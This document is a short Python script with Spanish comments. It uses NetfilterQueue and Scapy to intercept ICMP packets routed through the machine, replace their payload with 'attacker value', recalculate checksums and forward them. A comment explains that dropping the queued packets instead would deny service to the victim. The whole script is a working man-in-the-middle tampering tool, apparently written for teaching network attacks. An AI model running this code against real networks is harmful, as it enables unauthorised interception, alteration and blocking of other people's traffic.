from netfilterqueue import NetfilterQueue
from scapy.all import *

def recalculate(pkt):
    # Al modificar un paquete IP/ICMP en Scapy, los campos de longitud y checksum
    # pueden quedar desactualizados. Si no se recalculan, el receptor descartará
    # el paquete por considerarlo inválido.
    # Eliminamos estos campos para que Scapy los regenere automáticamente al
    # reconstruir el objeto desde sus bytes.
    del pkt[IP].len
    del pkt[IP].chksum
    del pkt[ICMP].chksum
    pkt = pkt.__class__(bytes(pkt))
    return pkt

def intercept(packet): # Función que procesa paquetes
    payload = packet.get_payload()
    spkt = IP(payload)
    # spkt.show() # Método para visualizar el paquete
    print("Ha llegado un nuevo paquete")
    if spkt.haslayer(ICMP) and spkt.haslayer(Raw):
        # Verificamos que exista capa Raw para evitar errores
        print("Datos originales: ", spkt[Raw].load)
        # Una vez se tienen los paquetes originales, se modifican.
        spkt[Raw].load = b'attacker value'  # Raw.load debe ser bytes
        spkt.show()
        # Recalcular los campos de valor
        spkt = recalculate(spkt)
    # Reenviar el paquete modificado
    packet.set_payload(bytes(spkt))
    packet.accept() 
    # Con el método 'packet.drop()' se eliminaría ese paquete logrando un DoS a esa máquina porque el tráfico
    # pasa a nuestra máquina, después a la cola y ahí se dropea (elimina) el paquete por lo que nunca llega a destino, 

if __name__ == '__main__':
    nfqueue = NetfilterQueue()
    # Este objeto funciona mediante "colas" donde cada paquete que se va a ir recibiendo, se podrán 
    # procesar, modifiar o lo que sea antes que salgan de nuestra máquina.
    nfqueue.bind(1, intercept) # El paquete 1 se almacena en esa cola y la función va a trabajar con este.
    try:
        print("[*] Escaneando paquetes de manera activa...")
        nfqueue.run()
    except KeyboardInterrupt:
        pass
